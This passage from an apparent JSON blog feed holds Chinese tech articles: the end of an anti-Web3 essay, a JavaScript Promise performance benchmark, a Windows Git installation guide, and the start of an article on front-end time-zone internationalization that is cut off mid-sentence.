攻击」。当一个实体获得了整个区块链网络中超过 51% 的控制权，就能通过「最长链原则」控制这个区块链网络的走向、从而伪造交易。这种攻击是如此的普遍，以至于每年至少要发生一次，如 <a href=\"https://news.bitcoin.com/privacy-coin-verge-third-51-attack-200-days-xvg-transactions-erased/\">2018 年 Verge 遭遇三次 51% 攻击</a>、<a href=\"https://thehackernews.com/2019/01/ethereum-double-spend-attack.html\">2019 年以太坊经典遭遇双重开支攻击，损失达 110 万美元</a> 和 2020 年 <a href=\"https://cointelegraph.com/news/bitcoin-gold-blockchain-hit-by-51-attack-leading-to-70k-double-spend\">比特黄金遭遇 51% 攻击，导致了 7 万美元的双重开支</a>。</p>\n<p>所有区块链应用（不仅仅是加密货币）在设计时，都需要预防一个实体、或多个实体的组合控制超过一半的网络，但是 Web3 显然没有考虑到这一点。</p>\n<h2>Web3 从人为制造的稀缺性中获利</h2>\n<blockquote><p>为了获得最大的利润，生产者会限制生产、而不是确保对资源的最大化利用。</p></blockquote>\n<p>由于 Web3 和数字货币密切相关，因此不可避免地继承了数字货币「通过人为制造的稀缺性中获利」的本质。尽管「通过技术、生产或分享，理论上可以创造出无限丰富的数字化实体」，但是它们依然是稀缺的、控制在少数人手中。</p>\n<p>「人为制造的稀缺」是一个经典的经济学概念，你可以在 <a href=\"https://en.wikipedia.org/wiki/Artificial_scarcity\">Wikipedia 上读到浅显易懂的介绍</a>。</p>\n<h2>Web3 满足的是大鳄和投机者，而非整个互联网</h2>\n<p>React Native 应用开发者、Serverless 和 JAMstack 领域的专家、前 AWS 技术带头人 Nader Dabit 曾经在他的文章 <a href=\"https://www.freecodecamp.org/news/what-is-web3/\">What is Web3? The Decentralized Internet of the Future Explained</a> 中介绍了「与 Facebook 等互联网巨头不同」的公司会如何构建 Web3：</p>\n<ul>\n<li>宣发一个新的、令人激动的项目</li>\n<li>任何人都可以从第一天开始参与建设，或天使投资</li>\n<li>公司发布一些代币、10% 用于奖励早期建设者、10% 卖给天使投资人，剩下的留作未来开支的预算</li>\n<li>投资者和建设者 <strong>需要用代币来为项目的未来投票</strong>\n</li>\n<li><strong>谁拥有的代币越多，谁就有话语权</strong></li>\n</ul>\n<hr>\n<p>记住，任何推动 Web3 或是加密货币的人都是那些能从中获得真实利润的人，他们对互联网的未来毫不关心：</p>\n<ul>\n<li><a href=\"https://www.coindesk.com/tech/2021/08/26/microsoft-is-awarded-us-patent-for-crypto-token-creation-service/\">微软成功获得加密代币创建服务（Crypto Token Creation as a Service）的专利</a></li>\n<li><a href=\"https://thenextweb.com/news/nike-blockchain-sneakers-cryptokick-patent\">耐克现在拥有将区块链用于运动鞋的专利：CryptoKicks</a></li>\n<li><a href=\"https://adage.com/article/marketing-news-strategy/mcdonalds-gets-inito-nft-game-mcrib/2376996\">麦当劳发行 MCNFT 纪念 Mcrib 的回归</a></li>\n<li><a href=\"https://www.scmp.com/lifestyle/k-pop/article/3155551/nfts-and-cryptocurrency-draw-k-pop-labels-behind-bts-blackpink\">BTS、Blackpink、Twice 和其他团体背后的 K-Pop 寻求用 NFT 和加密货币来说服粉丝消费</a></li>\n<li><a href=\"https://cointelegraph.com/news/reddit-to-reportedly-tokenize-karma-points-and-onboard-500m-new-users\">Reddit 将其 5 亿用户的 Karma 转换为 ERC-20 代币</a></li>\n</ul>\n<p>Web3 只会进一步加剧贫富差距、加剧社会分层、加剧阶级隔阂。</p>\n<div class=\"license\">\n<div>[译] 捍卫自由的互联网，对 Web3 说不</div>\n<div><a href=\"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/\">https://blog.skk.moe/post/keep-web-free-say-no-to-web3/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-12</div>\n</div>\n<div>              <div>更新于</div>\n<div>2021-12-13</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/keep-web-free-say-no-to-web3/"},{"title":"2021 年 JavaScript Promise 性能对比","date":"2021-12-07 08:19:00","description":"\n<p>我们正生活在一个「Any application that can be written in JavaScript, will eventually be written in JavaScript」的时代。作为一门兼具动态性和简单性的语言，JavaScript 已经占领了客户端、服务端，甚至在机器学习中也占据一席之地；不可避免的，异步执行也逐渐成为这门语言不可缺少的一部分。</p>\n<h2>TL; DR</h2>\n<ul>\n<li>Bluebird 依然是速度最快、内存占用最少的 Promise 实现</li>\n<li>Runtime 的 async / await 实现越来越快、顺序执行的性能已经超过 Native Promise，占用的内存也更少</li>\n<li>对于平行并发执行的 Promise，Bluebird 的性能依然一骑绝尘。编写运行在 Node.js 上的服务端程序仍然需要评估是否有必要引入 Bluebird</li>\n<li>所有对 Async / Await 的转译都不可避免的引入性能损耗；TypeScript Compiler（tsc）转译时引入的性能开销尤为明显，一般比原生 Async / Await 要慢至少两倍，同时要消耗更多的内存。</li>\n</ul>\n<h2>背景知识</h2>\n<h3>Node.js / v8 的 Promise 实现</h3>\n<p>关于 Bluebird vs Native，相信大部分读者肯定有一个问题：Bluebird 作为 Promise 的一个 JavaScript 实现，竟然会比 V8（Node.js 是基于 Chrome 的 V8 JavaScript 引擎的 Runtime）的 Native Promise 实现还快？</p>\n<p>实际上在 2017 年之前，<a href=\"https://github.com/v8/v8/blob/5.7.141/src/js/promise.js\">V8 的 Promise 也是用 JavaScript 实现的</a>、且并不完美，例如 <a href=\"https://github.com/v8/v8/blob/5.3.54/src/js/promise.js#L116-L119\">在 Promise 初始化时就分配数组给 Promise Handler</a> 导致不必要的内存占用；<a href=\"https://github.com/v8/v8/commit/1d4fe00287eabfb64d6bba51d685b2e668f179af\">V8 直到 2016 年 5 月才对此进行了优化</a>（V8 5.3.55）。<a href=\"https://github.com/v8/v8/commit/52e2c154ff18ae0e7ca807a5ad539750297c31b3#diff-9794588c64c777658e9ceb960f46260d0c49484ceb41e13dd1cc65ae1f05bd13\">V8 到 2016 年 12 月开始使用 C++ 实现 Promise</a>（V8 5.7.142）、在 Node.js 8 中落地（Node.js 7 使用的是 V8 5.5，Node.js 8 使用的是 V8 5.8）。</p>\n<h3>衡量 Promise 性能的方式</h3>\n<p><a href=\"https://blog.spion.dev/\">Gorgi Kosev</a> 在 2013 年 8 月发布了「<a href=\"https://blog.spion.dev/posts/analysis-generators-and-other-async-patterns-node.html\">Analysis of generators and other async patterns in node</a>」，详细介绍了 Generator Function，并与当时常见的异步实现（如 <code>Q.js</code>）、回调地狱的解决方案（<code>flatten.js</code>）的性能和编写难度进行了比较。Gorgi Kosev 提供了一段基于 Doxbee 的业务伪代码、涉及「数据库连接」「数据库事务回滚」「文件上传」「查询执行」等典型的 CRUD 和阻塞操作。后来，Bluebird 的作者为这段伪代码补充了一个 mock context，「Doxbee Benchmark」便成为了衡量 JavaScript 异步实现的性能的标准方法。V8 团队的 Maya Lekova 在 <a href=\"https://github.com/tc39/ecma262/pull/1250\">修改 ECMAScript Spec</a> 时，也使用了 Doxbee Benchmark 的数据来阐述修改的必要性。</p>\n<blockquote><p>顺便一提，早期 Promise 实现的性能完全无法入眼、一直被 JavaScript 开发者诟病，直到 2013 年 12 月 Petka Antonov 发布了 Bluebird 的首个版本，JavaScript 社区对 Promise 的印象才大幅改观。</p></blockquote>\n<h3>Bluebird 为什么这么快？</h3>\n<p>Bluebird 发布时，比同类实现快了将近 100 倍、内存占用却不到同类的十分之一；数年过去了，JavaScript 引擎的 JIT 不断进化（例如 V8 用 Turbofan 代替了 CrankShift），Bluebird 的性能依然在众多实现中出类拔萃脱颖而出。2016 年 Bluebird 的作者 Petka Antonov 写过一篇文章「<a href=\"https://www.reaktor.com/blog/javascript-performance-fundamentals-make-bluebird-fast/\">Three JavaScript performance fundamentals that make Bluebird fast</a>」，分享了三个简单且行之有效的 JavaScript 性能优化技巧。</p>\n<h2>Benchmark</h2>\n<p>此次 Benchmark 基于 V8 团队衡量 Async 优化、修改 ES Spec 时使用的 <a href=\"https://github.com/v8/promise-performance-tests/\">v8/promise-performance-tests</a> Benchmark Suite，额外增加了内存 RSS 统计，你可以前往 <a href=\"https://github.com/sukkaw/promise-performance-tests\">查看 Fork 后修改的版本</a>。</p>\n<p>运行环境为：</p>\n<pre><code class=\"hljs plaintext\">OS: Darwin 21.1.0 x64CPU: Intel(R) Core(TM) i9-9880H CPU @ 2.30GHz x 16Memory: 32768 MiB</code></pre>\n<h3>Bluebird vs Native Promise vs Native Async / Await</h3>\n<h4>顺序执行</h4>\n<p>顺序执行的 Promise 的特点是后一个 Promise 会用到前一个 Promise resolve 的值、只能在前一个 Promise fullfil 后执行：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> user = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/users/1'</span>);<span class=\"hljs-keyword\">const</span> job = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/jobs/<span class=\"hljs-subst\">${user.jobId}</span>`</span>);<span class=\"hljs-keyword\">const</span> colleagues = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">`/api/users/job/<span class=\"hljs-subst\">${job.id}</span>`</span>);</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/1.png\" alt=\"1\" width=\"3061\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/2.png\" alt=\"2\" width=\"3066\" height=\"1815\"></p>\n<p><strong>从 Node.js 12 开始，async/await 异步顺序执行的速度最快、占用内存最少</strong>，和 Node.js 12 使用的 V8 版本包含 Fast Async 的 Patch 不无关系；同时，Bluebird 比 Native Promise 的速度要快，占用的内存也更少。</p>\n<h4>平行执行</h4>\n<p>平行执行的 Promise 特点是数个 Promise 之间不存在依赖关系；虽然 JavaScript 是单线程的，当一个 Promise（非阻塞地）从外部 Worker（如 Network、File I/O 等）等待响应数据时，Runtime 可以将下一个 Promise 塞入 Event Loop 中：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> userIds = [<span class=\"hljs-number\">21</span>, <span class=\"hljs-number\">42</span>, <span class=\"hljs-number\">84</span>, <span class=\"hljs-number\">168</span>];<span class=\"hljs-keyword\">const</span> users = <span class=\"hljs-keyword\">await</span> <span class=\"hljs-built_in\">Promise</span>.all(userIds.map(<span class=\"hljs-function\"><span class=\"hljs-params\">id</span> =&gt;</span> fetch(<span class=\"hljs-string\">`/api/users/<span class=\"hljs-subst\">${id}</span>`</span>)));</code></pre>\n<p>平行执行的 Promise 的特点是使用 <code>Promise.all</code> 或 <code>Promise.allSettled</code>；Bluebird 除 <code>Bluebird.all</code> 以外，还有 <code>Bluebird.map</code> 和 <code>Bluebird.join</code> 可被用于平行执行。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/3.png\" alt=\"3\" width=\"3066\" height=\"1815\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.9/4.png\" alt=\"4\" width=\"3052\" height=\"1782\"></p>\n<p>Bluebird 在平行执行时的性能一骑绝尘，比 Native 实现速度快 2~3 倍、内存占用却微不足道。</p>\n<h3>Native Promise vs JavaScript Promise</h3>\n<p>截至本文写就，绝大部分浏览器均已支持 Promise。但是如果要为古董浏览器如 IE 提供 Promise 支持，则依然需要使用 JavaScript 实现的 Polyfill。</p>\n<p>参与 Benchmark 的 Promise 实现有：</p>\n<ul>\n<li><a href=\"http://bluebirdjs.com/\">Bluebird</a></li>\n<li>\n<a href=\"https://github.com/zloirock/core-js\">core-js</a>（Babel、swc 都依赖的 polyfill 集合）</li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise\">es6-promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/es6-promise-polyfill\">es6-promise-polyfill@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise\">promise@npm</a></li>\n<li><a href=\"https://www.npmjs.com/package/promise-polyfill\">promise-polyfill@npm</a></li>\n<li>\n<a href=\"https://www.npmjs.com/package/q\">Q.js</a>（支持 <code>new Q.Promise</code> 和 <code>Q.Promise</code> 两种使用方式，测试时调用不使用 <code>new</code>）</li>\n<li>\n<a href=\"https://www.npmjs.com/package/spromisemespeed\">SPromiseMeSpeed</a> （自称是最快的 Promise 实现、比 Bluebird 还快 2~548 倍）</li>\n<li><a href=\"https://www.npmjs.com/package/zousan\">Zousan</a></li>\n</ul>\n<h4>顺序执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.8/5.png\" alt=\"5\" width=\"2905\" height=\"1824\"></p>\n<p>不出意外，Bluebird 顺序执行的性能比 Native 还要优秀，内存占用更是不到 Native 的 1/3；<code>core-js</code>、<code>SPromiseMeSpeed</code>、<code>promise@npm</code> 和 <code>es6-promise-polyfill@npm</code> 的性能与内存占用和 Native 实现接近。</p>\n<h4>平行执行</h4>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/6.png\" alt=\"6\" width=\"2905\" height=\"1828\"></p>\n<p>Bluebird 在平行执行上的表现依然一骑绝尘，<code>promise@npm</code> 也取得了类似的不凡成绩；而 <code>core-js</code> 等提供 Polyfill 则显得些许力不从心。</p>\n<h3>Async / Await</h3>\n<p>截止到本文写就，不支持 Async Function 的浏览器也已经屈指可数。如果要向下兼容仅支持 ES2016 甚至 ES5 的浏览器的话，依然需要通过转译的方式来模拟 Async Function 的行为。</p>\n<p>参与 Benchmark 的转译器有：</p>\n<ul>\n<li>\n<a href=\"https://babeljs.io/\">Babel</a> 默认使用的 <a href=\"https://www.npmjs.com/package/regenerator-runtime\"><code>regenerator-runtime</code></a>\n</li>\n<li>Babel 的一个非官方插件 <a href=\"https://www.npmjs.com/package/fast-async\">fast-async</a>\n</li>\n<li>Babel 的另一个非官方插件 <a href=\"https://www.npmjs.com/package/babel-plugin-transform-async-to-promises\">babel-plugin-transform-async-to-promises</a>\n</li>\n<li>\n<a href=\"https://www.typescriptlang.org/docs/handbook/2/basic-types.html#tsc-the-typescript-compiler\">tsc</a>，TypeScript 的官方 Compiler</li>\n</ul>\n<p>Benchmark 包括顺序执行（doxbee）、平行执行（parallel）和一个由 v8 提供的 Fibonacci 的计算测试：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>* <span class=\"hljs-title\">fibonacciSequence</span>(<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> a = <span class=\"hljs-number\">0</span>, b = <span class=\"hljs-number\">1</span>; ;) {    <span class=\"hljs-keyword\">yield</span> a;    <span class=\"hljs-keyword\">const</span> c = a + b;    a = b;    b = c;  }}<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">fibonacci</span>(<span class=\"hljs-params\">id, n</span>) </span>{  <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">await</span> (<span class=\"hljs-keyword\">const</span> value <span class=\"hljs-keyword\">of</span> fibonacciSequence()) {    <span class=\"hljs-keyword\">if</span> (n-- === <span class=\"hljs-number\">0</span>) <span class=\"hljs-keyword\">return</span> value;  }};</code></pre>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/7.png\" alt=\"7\" width=\"3396\" height=\"2067\"></p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.7/8.png\" alt=\"8\" width=\"3391\" height=\"2071\"></p>\n<div class=\"license\">\n<div>2021 年 JavaScript Promise 性能对比</div>\n<div><a href=\"https://blog.skk.moe/post/promise-performance-benchmark/\">https://blog.skk.moe/post/promise-performance-benchmark/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2021-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/promise-performance-benchmark/"},{"title":"在 Windows 上快速安装 Hexo · 安装 Git","date":"2021-11-12 13:30:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p><strong>本文未经允许，禁止转载！</strong></p>\n<p><strong>视频教程正在制作，等待更新。</strong></p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95\" class=\"headerlink\" title=\"文章目录\"></a>文章目录</h3>\n<ul><li><a href=\"https://blog.yfun.top/posts/hexo-blog/install-git\">安装 Git</a></li></ul>\n<blockquote><p>更多文章等待更新...</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%8B%E8%BD%BD\" class=\"headerlink\" title=\"下载\"></a>下载</h2>\n<p>前往 Git 官网 (<a href=\"https://git-scm.com/\">https://git-scm.com</a>).</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112204849.png\"></p>\n<p>点击页面中的 <code>Download For Windows</code> 下载 Windows 版本。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211507.png\"></p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<p>双击运行安装文件。</p>\n<p>点击 <code>Next</code>，同意协议。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211528.png\"></p>\n<p>修改程序安装位置，点击 <code>Next</code>（直接装在 C 盘也不是不行）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211604.png\"></p>\n<p>组件选项，可选桌面快捷键、右键菜单、LFS 支持、自动检查更新等。</p>\n<p>点击 <code>Next</code> 进入下一步。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211609.png\"></p>\n<p>开始菜单文件夹名，保持默认就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211613.png\"></p>\n<p>默认编辑器，保持 Vim 就可以，点击 <code>Next</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211616.png\"></p>\n<p>环境变量，选择第 2 个，点击 <code>Next</code>。</p>\n<blockquote><p>如果选择第 1 个，则只能在 Git Bash 中使用，可能会出现问题</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211619.png\"></p>\n<p>剩下的都可以保持默认，一路 Next，然后点击 <code>Install</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211622.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211624.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211627.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211630.png\"><br><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/20211112211633.png\"></p>\n<p>等待安装完毕。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%B5%8B%E8%AF%95\" class=\"headerlink\" title=\"测试\"></a>测试</h2>\n<p>在文件夹处右击，点击 <code>Git Bash Here</code> 进入 Git Bash。</p>\n<p>（或是在开始菜单中找到 Git Bash）</p>\n<p>输入 <code>git --version</code> 查看版本，正确输出版本信息即代表安装成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.11/rawimg/7ec315b7764cc.png\"></p>\n<p>大功告成！</p>\n","link":"https://blog.yfun.top/posts/hexo-blog/install-git/"},{"title":"前端时间国际化 101","date":"2021-10-14 15:58:23","description":"\n<blockquote>\n<p>时间只是幻觉。</p>\n<footer>—— 阿尔伯特·爱因斯坦</footer>\n</blockquote>\n<p>最近在开发一个需要完善国际化方案的前端项目，在处理时间国际化的时候遇到了一些问题。于是花了一些时间研究，有了这篇文章。不过由于网上关于 JavaScript 中 <code>Date</code> 对象的坑的文章已经一抓一大把了，<strong>因此这篇文章不是 JavaScript 中 <code>Date</code> 对象的使用指南，而是只专注于前端时间国际化。</strong></p>\n<h1>从时区说起</h1>\n<p>要想处理时间，UTC 是一个绕不开的名字。协调世界时（Coordinated Universal Time）是目前通用的世界时间标准，计时基于原子钟，但并不等于 TAI（国际原子时）。TAI 不计算闰秒，但 UTC 会不定期插入闰秒，因此 UTC 与 TAI 的差异正在不断扩大。UTC 也接近于 GMT（格林威治标准时间），但不完全等同。可能很多人都发现近几年 GMT 已经越来越少出现了，这是因为 GMT 计时基于地球自转，由于地球自转的不规则性且正在逐渐变慢，目前已经基本被 UTC 所取代了。</p>\n<blockquote><p>JavaScript 的 <code>Date</code> 实现不处理闰秒。实际上，由于闰秒增加的不可预测性，Unix/POSIX 时间戳完全不考虑闰秒。在闰秒发生时，Unix 时间戳会重复一秒。这也意味着，一个时间戳对应两个时间点是有可能发生的。</p></blockquote>\n<p>由于 UTC 是标准的，我们有时会使用 UTC+/-N 的方式表达一个时区。这很容易理解，但并不准确。中国通行的 <code>Asia/Shanghai</code> 时区<strong>大部分</strong>情况下可以用 UTC+8 表示，但英国通行的 <code>Europe/London</code> 时区并不能用一个 UTC+N 的方式表示——由于夏令时制度，<code>Europe/London</code> 在夏天等于 UTC+1，在冬天等于 UTC/GMT。</p>\n<blockquote><p>一个时区与 UTC 的偏移并不一定是整小时。如 <code>Asia/Yangon</code> 当前为 UTC+6:30，而 <code>Australia/Eucla</code> 目前拥有奇妙的 UTC+8:45 的偏移。</p></blockquote>\n<p>夏令时的存在表明<strong>时间的表示不是连续的</strong>，时区之间的时差也并不是固定的，我们并不能用固定时差来处理时间，这很容易意识到。但一个不容易意识到的点是，时区还包含了其历史变更信息。中国目前不实行夏令时制度，那我们就可以放心用 UTC+8 来表示中国的时区了吗？你可能已经注意到了上一段中描述 <code>Asia/Shanghai</code> 时区时我使用了<strong>大部分</strong>一词。<code>Asia/Shanghai</code> 时区在历史上实行过夏令时，因此 <code>Asia/Shanghai</code> 在部分时间段可以使用 UTC+9 来表示。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">new Date('1988-04-18 00:00:00')\r\n// Mon Apr 18 1988 00:00:00 GMT+0900 (中国夏令时间)</pre>\n<blockquote><p>夏令时已经够混乱了，但它实际上比你想象得更混乱——部分穆斯林国家一年有四次夏令时切换（进入斋月时夏令时会暂时取消），还有一些国家使用混沌的 15/30 分钟夏令时而非通常的一小时。</p></blockquote>\n<blockquote><p><strong>不要总是基于 <code>00:00</code> 来判断一天的开始。</strong>部分国家使用 0:00-1:00 切换夏令时，这意味着 23:59 的下一分钟有可能是 1:00。</p></blockquote>\n<p>事实上，虽然一天只有 24 个小时，但当前（2021.10）正在使用的时区有超过 300 个。<strong>每一个时区都包含了其特定的历史。</strong>虽然有些时区在现在看起来是一致的，但它们都包含了不同的历史。时区也会创造新的历史。由于政治、经济或其他原因，一些时区会调整它们与 UTC 的偏差（萨摩亚曾经从 UTC-10 切换到 UTC+14，导致该国 2011.12.30 整一天都消失了），或是启用/取消夏令时，甚至有可能导致一个时区重新划分为两个。因此，为了正确处理各个时区，我们需要一个数据库来存放时区变更信息。还好，已经有人帮我们做了这些工作。目前大多数 *nix 系统和大量开源项目都在使用 <a href=\"https://www.iana.org/time-zones\" rel=\"noopener\">IANA 维护的时区数据库</a>（IANA TZ Database），其中包含了自 Unix 时间戳 0 以来各时区的变更信息。当然这一数据库也包含了大量 Unix 时间戳 0 之前的时区变更信息，但并不能保证这些信息的准确性。IANA 时区数据库会定期更新，以反映新的时区变更和新发现的历史史实导致的时区历史变更。</p>\n<blockquote><p>Windows 不使用 IANA 时区数据库。微软为 Windows 自己维护了一套<a href=\"https://docs.microsoft.com/zh-cn/troubleshoot/windows-client/system-management-components/daylight-saving-time-help-support\" rel=\"noopener\">时区数据库</a>，这有时会导致在一个系统上合法的时间在另一系统上不合法。</p></blockquote>\n<p>既然我们不能使用 UTC 偏移来表示一个时区，那就只能为每个时区定义一个标准名称。通常地，我们使用 <code>/</code> 来命名一个时区。这里的城市一般为该时区中人口最多的城市。于是，我们可以将中国的通行时区表示为 <code>Asia/Shanghai</code>。也有一些时区有自己的别名，如太平洋标准时间 <code>PST</code> 和协调世界时 <code>UTC</code>。</p>\n<blockquote><p>时区名称使用城市而非国家，是由于国家的变动通常比城市的变动要快得多。</p></blockquote>\n<blockquote><p><strong>城市不是时区的最小单位。</strong>有很多城市同时处于多个时区，甚至澳大利亚<a href=\"https://en.wikipedia.org/wiki/Gold_Coast_Airport\" rel=\"noopener\">有一个机场</a>的跑道两端处于不同的时区。</p></blockquote>\n<h1>处理时区困难重重</h1>\n<p>几个月前的一天，<a href=\"https://milkice.me/\" rel=\"noopener\">奶冰</a>在他的 Telegram 频道里发了这样的一条消息：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\"><img src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg\" alt=\"奶冰频道的消息\" width=\"500\" class=\"aligncenter size-medium wp-image-2490\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1.jpg 800w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-244x300.jpg 244w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-1-768x944.jpg 768w\" sizes=\"(max-width: 800px) 100vw, 800px\"></a>\n<p>你想的没错，这个问题正是由时区与 UTC 偏移的不同造成的。<code>Asia/Shanghai</code> 时区在 1940 年前后和 1986 年前后曾实行过夏令时，<strong>而夏令时的切换会导致一小时的出现和消失。</strong>具体来说，启用夏令时当天会有一个小时消失，如 2021.3.28 英国启用夏令时，1:00 直接跳到 3:00，导致 <code>2021-03-28 01:30:00</code> 在 <code>Europe/London</code> 时区中是不合法的；取消夏令时当天又会有一个小时重复，如 2021.10.31 英国取消夏令时，2:00 会重新跳回 1:00 一次，导致 <code>2021-10-31 01:30:00</code> 在 <code>Europe/London</code> 时区中对应了两个时间点。而在奶冰的例子中，<code>1988-04-10 00:46:50</code> 正好处于因夏令时启用而消失的一小时中，因此系统会认为此时间字符串不合法而拒绝解析。</p>\n<blockquote><p>你可能会注意到在历史上 1988.4.10 这一天 <code>Asia/Shanghai</code> 时区实际上是去掉了 1:00-2:00 这一小时而不是 0:00-1:00。上文问题更深层次的原因是，在 IANA TZDB 2018a 及更早版本中，IANA 因缺乏历史资料而设置了错误的夏令时规则，规则设定了夏令时交界于 0:00-1:00 从而导致上文问题发生。而随后社区<a href=\"http://mm.icann.org/pipermail/tz/2018-August/026760.html\" rel=\"noopener\">发现了更准确的史实</a>，因此 IANA 更新了数据库。上文的问题在更新了系统的时区数据库后便解决了。</p></blockquote>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg\" alt=\"IANA TZDB 2018a 及之前版本的错误数据\" width=\"1750\" height=\"595\" class=\"aligncenter size-full wp-image-2491\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2.jpg 1750w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-300x102.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1024x348.jpg 1024w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-768x261.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2021/10/time-2-1536x522.jpg 1536w\" sizes=\"(max-width: 1750px) 100vw, 1750px\"></a>\n<p><span>IANA TZDB 2018a 及之前版本的错误数据</span></p>\n<p>再来考虑另一种情况。你的应用的某位巴西用户在 2018 年保存了一个未来时间 <code>2022-01-15 12:00</code>（按当时的规律那应该是个夏令时时间），不巧那时候你的应用是以格式化的时间字符串形式保存的时间。之后你发现巴西已经于 2019 年 4 月宣布彻底取消夏令时制度，那么 <code>2022-01-15 12:00</code> 这个时间对应的 Unix 时间戳发生了变化，变得不再准确，要正确处理这一字符串就需要参考这一字符串生成的时间（或生成时计算的 UTC 偏移）来做不同的处理。<strong>因此，应用从一开始就应该避免使用字符串来传输、存储时间，而是使用 Unix 时间戳。</strong>如果不得不使用字符串存储时间，请尽可能：</p>\n<ul>\n<li>使用 UTC 描述时间，你永远不会知道本地时区在未来会发生什么</li>\n<li>如果需要以当地时间描述时间，一定带上当前 UTC 偏移</li>\n</ul>\n<p>时区历史带来的问题往往意想不到而且远比想象得多。实际上时区历史数据非常详细而繁多且跨设备不一致，并没有简单而统一的处理方法。在需要严谨处理时区时可能需要在应用程序中内嵌一套各端统一的时区数据库，但这样的方案放在前端又会带来不少问题：</p>\n<ul>\n<li>体积过大。moment.js 曾经设计过<a href=\"https://github.com/moment/moment-timezone/blob/develop/data/packed/2021a.json\" rel=\"noopener\">一种简洁的 TZDB 表示</a>，但尽管已经尽可能压缩整个文件仍然达到了 180+KB。在性能优先的 Web 